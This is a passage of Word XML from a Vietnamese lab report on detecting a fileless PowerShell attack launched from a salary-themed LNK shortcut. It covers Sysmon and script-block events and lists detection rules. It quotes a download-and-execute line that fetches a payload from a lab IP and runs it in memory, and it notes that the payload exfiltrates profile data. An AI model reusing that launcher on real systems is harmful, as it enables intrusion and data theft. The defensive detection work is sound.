          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: lệnh đầy đủ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ParentCommandLine</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: lệnh của process cha.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: user nào chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>explorer.exe -&gt; powershell.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Điểm đáng chú ý là người dùng mở shortcut từ Explorer nhưng process con lại là PowerShell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Sysmon Event ID 3 - Network Connection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cần nhìn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Process nào tạo network connection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Destination IP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Destination Port.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Process đó có hợp lý không.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe -&gt; 192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe -&gt; 192.168.141.1:8001</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell trên victim đã kết nối máy attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là bằng chứng network delivery của payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3. Sysmon Event ID 11 - File Create</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cần nhìn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>File nào được tạo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có file payload nào bị ghi xuống ổ đĩa không.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab mới, kỳ vọng không thấy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.dll</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể vẫn thấy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là delivery và launcher, không phải payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.4. PowerShell Event ID 4104 - Script Block Logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cần nhìn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nội dung script được PowerShell xử lý.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Invoke-RestMethod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> không.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ScriptBlock::Create</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> không.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có dấu hiệu download hoặc execute nội dung từ memory không.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Invoke-RestMethod 'http://192.168.141.1:8000/payload.ps1'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[ScriptBlock]::Create(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kết luận quan trọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Fileless không đồng nghĩa với không thể quan sát. Nếu bật logging đúng, defender vẫn có thể thấy dấu vết thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Detection logic cơ bản</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1. Rule 1 - Explorer sinh PowerShell từ hành vi mở shortcut</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu ParentImage là explorer.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>và Image là powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>và CommandLine chứa Invoke-RestMethod hoặc ScriptBlock</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lý do:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Người dùng bình thường mở file từ Explorer hiếm khi cần sinh PowerShell tải nội dung từ HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là dấu hiệu phù hợp với LNK launcher.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>False positive có thể có:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Script quản trị nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Công cụ hỗ trợ người dùng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Automation hợp pháp.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2. Rule 2 - PowerShell tải nội dung từ HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu Image là powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>và CommandLine chứa Invoke-RestMethod hoặc Invoke-WebRequest</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>và URL trỏ tới IP lạ</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lý do:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell có khả năng tải nội dung từ mạng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Khi kết hợp với execution, đây là hành vi rủi ro cao.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3. Rule 3 - PowerShell tạo ScriptBlock từ nội dung tải về</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu PowerShell command chứa ScriptBlock::Create</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>và trước đó có network request</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lý do:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ScriptBlock::Create</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> có thể biến chuỗi text thành code PowerShell để chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab, payload được giữ trong RAM rồi thực thi bằng cách này.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4. Rule 4 - PowerShell tạo kết nối mạng bất thường</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu Sysmon Event ID 3 ghi nhận powershell.exe kết nối tới IP/port bất thường</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe -&gt; 192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe -&gt; 192.168.141.1:8001</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> chứng minh PowerShell tải payload, còn port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> chứng minh payload gửi profile về collector. Trong thực tế, thay vì IP lab, có thể là IP public hoặc domain lạ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.5. Rule 5 - Không có payload file nhưng có execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng correlation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Có network download</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
